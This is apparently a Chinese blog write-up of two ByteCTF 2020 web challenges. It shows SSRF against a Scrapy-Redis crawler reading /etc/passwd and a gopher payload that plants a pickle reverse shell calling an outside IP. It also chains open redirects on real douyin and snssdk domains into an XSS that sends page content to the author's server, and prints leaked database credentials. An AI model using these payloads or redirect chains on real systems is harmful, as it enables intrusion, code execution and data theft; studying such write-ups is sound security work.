date: 2020-10-26
categories:
- 比赛
tags:
- web
- ctf
- wp
title:  2020ByteCTF
---
# ByteCTF2020

## web

### easy_scrapy

体验一编网站的功能后，发现如下api

```
/list
/push post:url=https%3A%2F%2Fwww.4399.com&code=16674458
/result?url=https://www.4399.com
```

让网站爬取自己的服务器以获得请求头

```
GET / HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en
User-Agent: scrapy_redis
Accept-Encoding: gzip, deflate
Host: ccreater.top:60000


```

通过ua头发现是：scrapy_redis

本地搭建scrapy_redis服务爬取网站，查看redis里设置的键值，发现myscrapy:requests中

![image528](https://raw.githubusercontent.com/Explorersss/photo/master/20201026113031.png)



存在的pickle数据

网站自然提交http和https协议的url，但是因为是爬虫猜测嵌入一个a标签就可以绕过这个限制

提交如下网站

```
<a href="file:///etc/passwd">
```



成功读取到/etc/passwd，把爬虫代码爬下来本地测试

scrapy.cfg

```python
# Automatically created by: scrapy startproject
#
# For more information about the [deploy] section see:
# https://scrapyd.readthedocs.io/en/latest/deploy.html

[settings]
default = bytectf.settings

[deploy]
#url = http://localhost:6800/
project = bytectf
```

bytectf/settings.py

```python
BOT_NAME = 'bytectf'
SPIDER_MODULES = ['bytectf.spiders']
NEWSPIDER_MODULE = 'bytectf.spiders'
RETRY_ENABLED = False
ROBOTSTXT_OBEY = False
DOWNLOAD_TIMEOUT = 8
USER_AGENT = 'scrapy_redis'
SCHEDULER = "scrapy_redis.scheduler.Scheduler"
DUPEFILTER_CLASS = "scrapy_redis.dupefilter.RFPDupeFilter"
REDIS_HOST = '172.20.0.7'
REDIS_PORT = 6379
ITEM_PIPELINES = {
   'bytectf.pipelines.BytectfPipeline': 300,
}
```

bytectf/byte.py

```python
import scrapy
import re
import base64
from scrapy_redis.spiders import RedisSpider
from bytectf.items import BytectfItem

class ByteSpider(RedisSpider):
    name = 'byte'

    def parse(self, response):
        byte_item = BytectfItem()
        byte_item['byte_start'] = response.request.url#ä¸»é®ï¼åå§url
        url_list = []
        test = response.xpath('//a/@href').getall()
        for i in test:
            if i[0] == '/':
                url = response.request.url + i
            else:
                url = i
            if re.search(r'://',url):
                r = scrapy.Request(url,callback=self.parse2,dont_filter=True)
                r.meta['item'] = byte_item
                yield r
                url_list.append(url)
                if(len(url_list)>3):
                    break
        byte_item['byte_url'] = response.request.url
        byte_item['byte_text'] = base64.b64encode((response.text).encode('utf-8'))
        yield byte_item

    def parse2(self,response):
        item = response.meta['item']
        item['byte_url'] = response.request.url
        item['byte_text'] = base64.b64encode((response.text).encode('utf-8'))
        yield item
```

bytectf/items.py

```python
import scrapy


class BytectfItem(scrapy.Item):
    # define the fields for your item here like:
    # name = scrapy.Field()
    byte_start = scrapy.Field()#
    byte_text = scrapy.Field()#text
```

bytectf/pipelines.py

```python
import pymongo

class BytectfPipeline:
    def __init__:
        MONGODB_HOST = '172.20.0.8'
        MONGODB_PORT = 27017
        MONGODB_DBNAME = 'result'
        MONGODB_TABLE = 'result'
        MONGODB_USER = 'N0rth3'
        MONGODB_PASSWD = 'E7B70D0456DAD39E22735E0AC64A69AD'
        mongo_client = pymongo.MongoClient("%s:%d" % (MONGODB_HOST, MONGODB_PORT))
        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)
        mongo_db = mongo_client[MONGODB_DBNAME]
        self.table = mongo_db[MONGODB_TABLE]



    def process_item(self, item, spider):
        quote_info = dict(item)
        print(quote_info)
        self.table.insert(quote_info)
        return item
```

测试`<a href="gopher://.....">`发现并不能解析gopher协议

继续测试发现接口`/result?url=https://www.4399.com`，也存在ssrf漏洞且至此gopher协议

传入以下payload:

```
gopher%3a//172.20.0.7%3a6379/_%250D%250Azadd%2520byte%253Arequests%25201%2520%2522cos%255Cnsystem%255Cn%2528S%2527python%2520-c%2520%255Cx27import%2520socket%252Csubprocess%252Cos%253Bs%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253Bs.connect%2528%2528%255Cx2239.108.164.219%255Cx22%252C60003%2529%2529%253Bos.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253Bp%253Dsubprocess.call%2528%255B%255Cx22/bin/sh%255Cx22%252C%255Cx22-i%255Cx22%255D%2529%253B%255Cx27%2527%255CntR.%2522%250D%250Aquit%250D%250A
```

成功弹回shell

### douyin_vedio

题目描述

>Do you like douyin video?
>Submit your payload at http://c.bytectf.live:30002/
>
>( Server URLs which only admin can access:
>http://a.bytectf.live:30001/
>http://b.bytectf.live:30001/ )

题目中只能将http://a.bytectf.live:30001/ 开头的url发给管理员，而c.bytectf.live中存在未过滤的xss点

思路就很清晰了，想办法跳转到c.bytectf.live再说，我们查看源代码发现：

```
RewriteRule /favicon.ico$ /favicon.ico [QSA,PT,L]
RewriteRule /$ / [QSA,PT,L]
RewriteRule /search$ /search [QSA,PT,L]
RewriteRule /send$ /send [QSA,PT,L]
RewriteRule /static/(.*)$ /static/$1 [QSA,PT,L]
RewriteRule (.*)$ http://www.douyin.com$1  
```



最后一个神奇的重写规则，所以我们只要在www.douyin.com下找到一个任意url跳转就可以执行c.bytectf.live的xss

通常url跳转常出现在登入登出，还有外站url跳转，顺着这个思路我们可以找到`http://www.douyin.com/logout/?next=https%3A%2F%2Fwww.douyin.com/23333`可以跳转到部分域名(www.douyin.com , creator.douyin.com ...)

这样就扩大了我们的攻击面，继续按照相同的思路进一步扩大攻击面的url:`https://creator.douyin.com/passport/web/logout/?next=https://www.douyin.com`

测试发现可以跳转到任意`douyin.com/bytedance.com/.bytecdn.cn/ixigua.com/bytedance.net/snssdk.com/toutiao.com/huoshan.com/jinritemai.com`结尾的域名

接着用谷歌搜索：`site:xxxxxxx.com 跳转` 发现任意url跳转:`https://tsearch-quic.snssdk.com/search/jump?url=http://ccreater.top:60080`

组合成跳转到c.bytectf.live的url:

```
http://a.bytectf.live:30001/logout?next=https%3a//creator.douyin.com/passport/web/logout/%3fnext%3dhttps://tsearch-quic.snssdk.com/search/jump?url=http://c.bytectf.live:30002/?action=post%25252526id=b44cb32f302e2d4249dea06a2ffa0da1
```

因为安全策略的设置问题(`frame-ancestors http://*.bytectf.live:*/`覆盖了`['X-Frame-Options'] = 'sameorigin'`)，导致我们可以直接作为iframe导入，读取内容

```
	resp.headers['X-Frame-Options'] = 'sameorigin'
    resp.headers['Content-Security-Policy'] = "default-src http://*.bytectf.live:*/ 'unsafe-inline'; frame-src *; frame-ancestors http://*.bytectf.live:*/"
    resp.headers['X-Content-Type-Options'] = 'nosniff'
    resp.headers['Referrer-Policy'] = 'same-origin'
```

所以xss的代码是：

```javascript
document.domain="bytectf.live"; 
flagPage=document.createElement("iframe"); flagPage.src="http://a.bytectf.live:30001/?keyword=B"; document.body.append(flagPage); setTimeout(()=>{ document.location="http://ccreater.top:60001/"+btoa(document.body.getElementsByTagName("iframe")[0].contentWindow.document.body.innerHTML) },500)

```

但是不知道为啥iframe.src=`http://a.bytectf.live:30001/`可以获取到内容，而`http://a.bytectf.live:30001/send`却不可以。。。

监听端口成功拿到flag

